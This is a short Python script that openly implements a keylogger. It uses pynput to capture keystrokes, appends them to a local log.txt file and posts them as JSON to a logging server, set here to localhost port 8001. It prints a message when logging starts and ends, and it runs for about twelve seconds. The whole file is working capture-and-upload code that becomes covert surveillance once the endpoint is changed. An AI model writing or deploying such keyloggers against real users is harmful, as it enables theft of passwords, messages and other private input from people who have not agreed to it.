from typing import List

from pynput.keyboard import Key, Listener


import requests


SERVER = "http://127.0.0.1:8001/logs"

REQUEST_TIMEOUT = 5


char_count = 0

saved_keys: List[str] = []


def send_to_server(text: str) -> None:


    try:

        response = requests.post(

            SERVER,

            json={"text": text + "\n"},

            timeout=REQUEST_TIMEOUT,

        )

        response.raise_for_status()

        print("Saved to server")

    except requests.RequestException as error:

        print("Server error:", error)



def on_key_press(key):

    try:

        print("Key Pressed: ", key)

    except Exception as ex:

        print("There was an error: ", ex)



def on_key_release(key):

    global saved_keys, char_count



    if key == Key.esc:

        flush(saved_keys)

        return False



    if key == Key.enter:

        flush(saved_keys)

        saved_keys = []

        char_count = 0

        return  


    if key == Key.space:

        flush(saved_keys)

        saved_keys = [" "]

        char_count = 1

        return



    saved_keys.append(key)

    char_count += 1




def flush(keys: List[str]) -> None:

  
    text = format_keys(keys)

    if not text:

        return



    write_to_file(text)

    send_to_server(text)




def format_keys(keys: List[str]) -> str:

    result = []

    for key in keys:

        key_str = str(key).replace("'", "")

        if "key" not in key_str.lower():

            result.append(key_str)

    return "".join(result)



def write_to_file(text: str) -> None:

    with open("log.txt", "a", encoding="utf-8") as file:

        file.write(text + "\n")



if __name__ == "__main__":

    with Listener(on_press=on_key_press, on_release=on_key_release) as listener:

        print("Start key logging...")

        listener.join(timeout=0.2 * 60)

        print("End key logging...")
